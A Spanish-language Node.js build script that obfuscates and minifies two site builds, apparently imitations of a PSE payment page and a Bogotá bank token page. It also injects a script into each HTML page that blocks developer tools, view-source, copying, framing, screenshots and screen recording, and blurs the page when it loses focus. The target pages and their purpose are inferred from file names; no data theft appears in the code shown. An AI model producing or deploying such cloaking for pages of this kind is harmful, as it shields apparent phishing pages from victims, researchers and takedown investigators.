/* ============================================
   OFUSCAR PYP + BOGOTA
   + ANTI-INSPECCIÓN
   + ANTI-CAPTURAS DE PANTALLA
   + OPTIMIZACIÓN DE IMÁGENES CON SHARP
   ============================================ */

const fs = require('fs');
const path = require('path');
const JavaScriptObfuscator = require('javascript-obfuscator');
const { minify: minifyHTML } = require('html-minifier-terser');
const CleanCSS = require('clean-css');

let sharp = null;
try {
    sharp = require('sharp');
} catch (e) {
    console.log('⚠️  Sharp no instalado - se omitirá la optimización de imágenes');
    console.log('   Instálalo con: npm install sharp\n');
}

// ============================================
// CONFIGURACIÓN DE CARPETAS
// ============================================
const CARPETA_PYP = path.join(__dirname, 'pyp-build');
const CARPETA_BOGOTA = path.join(__dirname, 'bogota-build');

// ============================================
// CONFIGURACIÓN DEL OFUSCADOR JS
// ============================================
const CONFIG_JS = {
    compact: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 0.75,
    deadCodeInjection: true,
    deadCodeInjectionThreshold: 0.4,
    debugProtection: false,
    debugProtectionInterval: 0,
    disableConsoleOutput: true,
    identifierNamesGenerator: 'hexadecimal',
    log: false,
    numbersToExpressions: true,
    renameGlobals: false,
    selfDefending: true,
    simplify: true,
    splitStrings: true,
    splitStringsChunkLength: 10,
    stringArray: true,
    stringArrayCallsTransform: true,
    stringArrayEncoding: ['base64'],
    stringArrayIndexShift: true,
    stringArrayRotate: true,
    stringArrayShuffle: true,
    stringArrayWrappersCount: 2,
    stringArrayWrappersChainedCalls: true,
    stringArrayWrappersParametersMaxCount: 4,
    stringArrayWrappersType: 'function',
    stringArrayThreshold: 0.75,
    unicodeEscapeSequence: false,
    transformObjectKeys: true
};

// ============================================
// BLOQUE ANTI-INSPECCIÓN + ANTI-CAPTURAS
// ============================================
const BLOQUE_ANTI = `
<script>
(function(){
'use strict';
var _0xa1=0;
document.addEventListener('touchend',function(_0xb2){
var _0xc3=new Date().getTime();
if(_0xc3-_0xa1<=300){_0xb2.preventDefault();}
_0xa1=_0xc3;
},{passive:false});
document.addEventListener('dblclick',function(_0xd4){_0xd4.preventDefault();});
document.addEventListener('contextmenu',function(_0xe5){_0xe5.preventDefault();return false;});
document.addEventListener('keydown',function(_0xf6){
var _0xg7=(_0xf6.key||'').toLowerCase();
var _0xh8=_0xf6.ctrlKey||_0xf6.metaKey;
var _0xi9=_0xf6.shiftKey;
if(_0xg7==='f12'){_0xf6.preventDefault();return false;}
if(_0xh8&&_0xi9&&(_0xg7==='i'||_0xg7==='j'||_0xg7==='c')){_0xf6.preventDefault();return false;}
if(_0xh8&&_0xg7==='u'){_0xf6.preventDefault();return false;}
if(_0xh8&&_0xg7==='s'){_0xf6.preventDefault();return false;}
if(_0xh8&&_0xg7==='p'){_0xf6.preventDefault();return false;}
if(_0xh8&&_0xg7==='a'){_0xf6.preventDefault();return false;}
});
document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
document.addEventListener('selectstart',function(_0xl1){_0xl1.preventDefault();});
document.addEventListener('copy',function(_0xm2){_0xm2.preventDefault();return false;});
document.addEventListener('cut',function(_0xn3){_0xn3.preventDefault();return false;});

try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xo4){document.body.innerHTML='';}

var _0xp5=null;
function _0xq6(){
    document.documentElement.style.filter='blur(20px)';
    document.documentElement.style.transition='filter 0.1s';
    setTimeout(function(){
        document.documentElement.style.filter='';
    },1500);
}
window.addEventListener('keyup',function(_0xr7){
    var _0xs8=_0xr7.key||'';
    var _0xt9=_0xs8.toLowerCase();
    if(_0xt9==='printscreen'||_0xr7.keyCode===44){
        _0xq6();
        if(navigator.clipboard&&navigator.clipboard.writeText){
            try{navigator.clipboard.writeText('');}catch(e){}
        }
    }
    if(_0xr7.metaKey&&_0xr7.shiftKey&&_0xt9==='s'){_0xq6();}
    if(_0xr7.metaKey&&_0xt9==='printscreen'){_0xq6();}
    if(_0xr7.metaKey&&_0xr7.shiftKey&&(_0xt9==='3'||_0xt9==='4'||_0xt9==='5')){_0xq6();}
},{capture:true});

var _0xu0=0;
window.addEventListener('blur',function(){
    _0xu0=new Date().getTime();
    _0xq6();
});
window.addEventListener('focus',function(){
    if(_0xu0>0){
        var _0xv1=new Date().getTime()-_0xu0;
        if(_0xv1<800){_0xq6();}
    }
});

document.addEventListener('visibilitychange',function(){
    if(document.hidden){document.body.style.filter='blur(30px)';}
    else{document.body.style.filter='';}
});

if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia){
    var _0xw2=navigator.mediaDevices.getDisplayMedia;
    navigator.mediaDevices.getDisplayMedia=function(){
        _0xq6();
        return Promise.reject(new Error('Captura de pantalla no permitida'));
    };
}

if(window.MediaRecorder){
    var _0xx3=window.MediaRecorder;
    window.MediaRecorder=function(){
        _0xq6();
        throw new Error('Grabación no permitida');
    };
}

var _0xy4=new Image();
Object.defineProperty(_0xy4,'id',{
    get:function(){
        document.body.style.filter='blur(15px)';
        setTimeout(function(){document.body.style.filter='';},2000);
    }
});

if(navigator.clipboard){
    try{
        navigator.clipboard.writeText=function(){return Promise.reject();};
        navigator.clipboard.write=function(){return Promise.reject();};
    }catch(e){}
}

})();
</script>
`;

// ============================================
// FUNCIONES DE OFUSCACIÓN
// ============================================
function ofuscarJS(carpeta, archivo) {
    const ruta = path.join(carpeta, archivo);
    if (!fs.existsSync(ruta)) {
        console.log(`   ⚠️  No existe: ${archivo}`);
        return;
    }

    try {
        const codigo = fs.readFileSync(ruta, 'utf8');
        const resultado = JavaScriptObfuscator.obfuscate(codigo, CONFIG_JS);
        fs.writeFileSync(ruta, resultado.getObfuscatedCode());
        console.log(`   ✅ ${archivo}`);
    } catch (err) {
        console.log(`   ❌ Error en ${archivo}: ${err.message}`);
    }
}

async function minificarHTML(carpeta, archivo) {
    const ruta = path.join(carpeta, archivo);
    if (!fs.existsSync(ruta)) {
        console.log(`   ⚠️  No existe: ${archivo}`);
        return;
    }

    try {
        let codigo = fs.readFileSync(ruta, 'utf8');

        if (codigo.indexOf('_0xa1=0') === -1 && codigo.indexOf("addEventListener('contextmenu'") === -1) {
            if (codigo.indexOf('</body>') !== -1) {
                codigo = codigo.replace('</body>', BLOQUE_ANTI + '</body>');
            } else {
                codigo += BLOQUE_ANTI;
            }
        }

        const resultado = await minifyHTML(codigo, {
            collapseWhitespace: true,
            removeComments: true,
            removeRedundantAttributes: true,
            removeScriptTypeAttributes: true,
            removeStyleLinkTypeAttributes: true,
            useShortDoctype: true,
            minifyCSS: true,
            minifyJS: false
        });
        fs.writeFileSync(ruta, resultado);
        console.log(`   ✅ ${archivo}`);
    } catch (err) {
        console.log(`   ❌ Error en ${archivo}: ${err.message}`);
    }
}

function minificarCSS(carpeta, archivo) {
    const ruta = path.join(carpeta, archivo);
    if (!fs.existsSync(ruta)) {
        console.log(`   ⚠️  No existe: ${archivo}`);
        return;
    }

    try {
        const codigo = fs.readFileSync(ruta, 'utf8');
        const resultado = new CleanCSS({ level: 2 }).minify(codigo);
        fs.writeFileSync(ruta, resultado.styles);
        console.log(`   ✅ ${archivo}`);
    } catch (err) {
        console.log(`   ❌ Error en ${archivo}: ${err.message}`);
    }
}

// ============================================
// OPTIMIZACIÓN DE IMÁGENES
// ============================================
async function optimizarImagen(rutaEntrada) {
    const ext = path.extname(rutaEntrada).toLowerCase();
    const nombre = path.basename(rutaEntrada);
    const statsAntes = fs.statSync(rutaEntrada).size;

    if (ext === '.gif') {
        console.log(`   ⏭️  Saltando: ${nombre} (GIF animado)`);
        return;
    }

    if (!/\.(jpg|jpeg|png|webp)$/i.test(ext)) {
        return;
    }

    let pipeline = sharp(rutaEntrada);

    try {
        if (ext === '.jpg' || ext === '.jpeg') {
            pipeline = pipeline.jpeg({ quality: 80, mozjpeg: true, progressive: true });
        } else if (ext === '.png') {
            pipeline = pipeline.png({ compressionLevel: 9, palette: true });
        } else if (ext === '.webp') {
            pipeline = pipeline.webp({ quality: 80, effort: 4 });
        }

        const buffer = await pipeline.toBuffer();
        fs.writeFileSync(rutaEntrada, buffer);

        const statsDespues = fs.statSync(rutaEntrada).size;
        const ahorro = ((1 - statsDespues / statsAntes) * 100).toFixed(1);

        if (ahorro > 0) {
            console.log(`   ✅ ${nombre}: ${(statsAntes/1024).toFixed(1)}KB → ${(statsDespues/1024).toFixed(1)}KB (-${ahorro}%)`);
        } else {
            console.log(`   ✅ ${nombre}: ya estaba optimizada`);
        }
    } catch (err) {
        console.log(`   ❌ Error en ${nombre}: ${err.message}`);
    }
}

async function optimizarCarpeta(carpeta) {
    if (!fs.existsSync(carpeta)) {
        return;
    }

    const archivos = fs.readdirSync(carpeta);

    for (const archivo of archivos) {
        const rutaCompleta = path.join(carpeta, archivo);
        const stat = fs.statSync(rutaCompleta);

        if (stat.isDirectory()) {
            await optimizarCarpeta(rutaCompleta);
        } else {
            await optimizarImagen(rutaCompleta);
        }
    }
}

// ============================================
// PROCESAR PYP
// ============================================
async function procesarPYP() {
    console.log('\n═══════════════════════════════════════');
    console.log('🔒 PROCESANDO PYP (pyp-build)');
    console.log('═══════════════════════════════════════\n');

    if (!fs.existsSync(CARPETA_PYP)) {
        console.log(`❌ ERROR: No existe la carpeta "${CARPETA_PYP}"\n`);
        return;
    }

    console.log('📄 Minificando HTML + anti-inspección:');
    await minificarHTML(CARPETA_PYP, 'index.html');

    console.log('\n📄 Ofuscando archivos JS:');
    ofuscarJS(CARPETA_PYP, 'pse-animacion.js');

    console.log('\n📄 Minificando CSS:');
    minificarCSS(CARPETA_PYP, 'styles.css');

    if (sharp) {
        console.log('\n🖼️  Optimizando imágenes:');
        await optimizarCarpeta(path.join(CARPETA_PYP, 'img'));
    }
}

// ============================================
// PROCESAR BOGOTA
// ============================================
async function procesarBogota() {
    console.log('\n═══════════════════════════════════════');
    console.log('🔒 PROCESANDO BOGOTA (bogota-build)');
    console.log('═══════════════════════════════════════\n');

    if (!fs.existsSync(CARPETA_BOGOTA)) {
        console.log(`❌ ERROR: No existe la carpeta "${CARPETA_BOGOTA}"\n`);
        return;
    }

    console.log('📄 Minificando HTML + anti-inspección:');
    await minificarHTML(CARPETA_BOGOTA, 'index.html');
    await minificarHTML(CARPETA_BOGOTA, 'token.html');

    console.log('\n📄 Minificando CSS:');
    minificarCSS(CARPETA_BOGOTA, 'index.css');
    minificarCSS(CARPETA_BOGOTA, 'token.css');
    minificarCSS(CARPETA_BOGOTA, 'loading-overlay.css');

    if (sharp) {
        console.log('\n🖼️  Optimizando imágenes:');
        await optimizarCarpeta(path.join(CARPETA_BOGOTA, 'img'));
    }
}

// ============================================
// EJECUTAR
// ============================================
async function main() {
    console.log('\n╔═══════════════════════════════════════╗');
    console.log('║   OFUSCADOR PYP + BOGOTÁ + ANTI-INS   ║');
    console.log('╚═══════════════════════════════════════╝');

    await procesarPYP();
    await procesarBogota();

    console.log('\n╔═══════════════════════════════════════╗');
    console.log('║   ✅ TODO OFUSCADO + PROTEGIDO        ║');
    console.log('╚═══════════════════════════════════════╝');

    console.log('\n🔒 Protecciones activadas:');
    console.log('   ❌ F12 bloqueado');
    console.log('   ❌ Ctrl+Shift+I / J / C bloqueado');
    console.log('   ❌ Ctrl+U / S / P / A bloqueado');
    console.log('   ❌ Click derecho bloqueado');
    console.log('   ❌ Arrastrar / Copiar / Cortar / Seleccionar bloqueado');
    console.log('   ❌ Iframes bloqueados');
    console.log('   ❌ PrintScreen bloqueado (blur + limpieza clipboard)');
    console.log('   ❌ Windows + Shift + S / PrintScreen bloqueado');
    console.log('   ❌ Cmd + Shift + 3/4/5 (Mac) bloqueado');
    console.log('   ❌ getDisplayMedia bloqueado');
    console.log('   ❌ MediaRecorder bloqueado');
    console.log('   ❌ Cambio de pestaña → blur');
    console.log('   ❌ Pérdida de foco → blur');
    console.log('   ❌ Clipboard API deshabilitada');

    console.log('\n🖼️  Optimización de imágenes:');
    if (sharp) {
        console.log('   ✅ JPG/JPEG comprimidos (calidad 80)');
        console.log('   ✅ PNG comprimidos nivel 9 + palette');
        console.log('   ✅ WebP comprimidos (calidad 80)');
        console.log('   ⏭️  GIFs saltados');
    } else {
        console.log('   ⚠️  Sharp no instalado');
    }
    console.log('');
}

main();